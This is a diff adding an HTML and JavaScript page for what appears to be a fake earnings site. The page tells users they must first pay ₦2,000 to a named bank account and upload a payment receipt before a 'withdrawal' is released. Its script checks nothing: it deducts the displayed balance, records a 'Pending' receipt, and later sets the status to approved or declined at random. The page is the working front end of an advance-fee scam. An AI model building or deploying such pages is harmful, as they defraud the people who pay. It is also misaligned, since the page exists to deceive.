@@ -1,0 +1,145 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>Withdrawal Request Task</title>
+<style>
+body {
+font-family: Arial, sans-serif;
+background-color: #f7f7f7;
+}
+.container {
+width: 80%;
+margin: 40px auto;
+background-color: #fff;
+padding: 20px;
+border: 1px solid #ddd;
+box-shadow: 0 0 10px rgba(0,0,0,0.1);
+}
+.header {
+color: #007;
+padding: 10px;
+text-align: center;
+}
+.notice {
+background-color: #ff9900;
+padding: 10px;
+border: 1px solid #ff9900;
+margin-top: 20px;
+}
+.button {
+background-color: #007;
+color: #fff;
+border: none;
+padding: 10px 20px;
+font-size: 16px;
+cursor: pointer;
+}
+.button:hover {
+background-color: #005;
+}
+#sender-name{
+width: 260px;
+height:10px;
+margin: 20px auto;
+padding: 15px;
+border: 5px solid #ddd;
+border-radius: 15px;
+box-shadow: 0 0 10px rgba(0,0,0,0.1);
+}
+#payment-proof{
+  height:20px;
+  font-weight:bold;
+}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="header">
+<h2 style="color: #007;">Withdrawal Request Task</h2>
+</div>
+<p style="font-size: 16px; font-weight:bold; color: #007;">To complete your withdrawal, please send a payment of ₦2,000 to the following account details and upload your payment proof:</p>
+<ul style="list-style: none; padding: 0; margin: 0;">
+<li style="background-color: #f7f7f7; padding: 10px; border-bottom: 1px solid #ddd; color: black; font-weight:bold;">Account Name: [MFY / Valtopup-WIL]</li>
+<li style="background-color: #f7f7f7; padding: 10px; border-bottom: 1px solid #ddd; color: black; font-weight:bold;">Account Number: [5257529781]</li>
+<li style="background-color: #f7f7f7; padding: 10px; color: black; font-weight:bold;">Bank Name: [Sterling Bank]</li>
+</div>
+</ul>
+<input type="file" id="payment-proof" accept="image/*">
+<input type="text" id="sender-name" name="sender_name" placeholder="ENTER SENDER'S NAME"/>
+<button class="button" id="submit-button">SUBMIT PAYMENT PROOF</button>
+<div class="notice">
+<p style="font-size: 16px; font-weight: bold;">IMPORTANT NOTICE:</p>
+<p style="font-size: 16px; font-weight:bold; color:black;">Fake payment proofs will result in account ban and forfeiture of all earnings. Ensure you upload a genuine payment receipt to avoid penalties.</p>
+</div>
+</div>
+<script>
+const submitButton = document.getElementById('submit-button');
+const paymentProofInput = document.getElementById('payment-proof');
+
+submitButton.addEventListener('click', () => {
+  const paymentProof = paymentProofInput.files[0];
+  if (!paymentProof) {
+    alert('Please select a payment proof!');
+    return;
+  }
+  alert('Verifying Payment, please wait... Do not close this page! Kindly Press Ok to continue');
+  setTimeout(() => {
+    const amountToWithdraw = parseFloat(localStorage.getItem('amountToWithdraw'));
+    const userData = JSON.parse(localStorage.getItem('userData'));
+    const withdrawalHistory = JSON.parse(localStorage.getItem('withdrawalHistory')) || [];
+    userData.balance -= amountToWithdraw;
+    localStorage.setItem('userData', JSON.stringify(userData));
+    // Generate receipt with pending status
+    const receipt = {
+      transactionNumber: generateTransactionNumber(),
+      amount: amountToWithdraw + ' ',
+      date: new Date().toLocaleString(),
+      status: 'Pending'
+    };
+    withdrawalHistory.push(receipt);
+    localStorage.setItem('withdrawalHistory', JSON.stringify(withdrawalHistory));
+    alert('Withdrawal Submitted for approval! Your new balance is ' + userData.balance + ' ');
+    setTimeout(() => {
+      window.location.href = 'withdrawal-history.html';
+    }, 2000);
+  }, 2000); // 2000 milliseconds = 2 second
+
+  // Save withdrawal history
+  window.addEventListener('beforeunload', () => {
+    const withdrawalHistory = JSON.parse(localStorage.getItem('withdrawalHistory'));
+    localStorage.setItem('withdrawalHistory', JSON.stringify(withdrawalHistory));
+  });
+
+  // Check for pending withdrawals and update their status when user returns to the page
+  window.addEventListener('load', () => {
+    const withdrawalHistory = JSON.parse(localStorage.getItem('withdrawalHistory'));
+    withdrawalHistory.forEach((receipt) => {
+      if (receipt.status === 'Pending') {
+        // Update the withdrawal status after 1 minute
+        setTimeout(() => {
+          // Randomly decide whether to approve or decline the withdrawal
+          const approve = Math.random() < 0.5;
+          receipt.status = approve ? 'Successful' : 'Declined';
+          // Save the updated withdrawal history to local storage
+          localStorage.setItem('withdrawalHistory', JSON.stringify(withdrawalHistory));
+          // Display a notification to the user (if online)
+          if (navigator.onLine) {
+            alert(`Withdrawal status updated to ${receipt.status}!`);
+          }
+        }, 60000); // 60000 milliseconds = 1 minute
+      }
+    });
+  });
+});
+
+function generateTransactionNumber() {
+  const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+  const randomAlphabet = alphabet.substring(Math.floor(Math.random() * alphabet.length), Math.floor(Math.random() * alphabet.length) + 3);
+  const randomNumber = Math.floor(Math.random() * 10000000000);
+  return randomAlphabet + randomNumber.toString();
+}
+
+  </script>
+  </body>
+  </html>
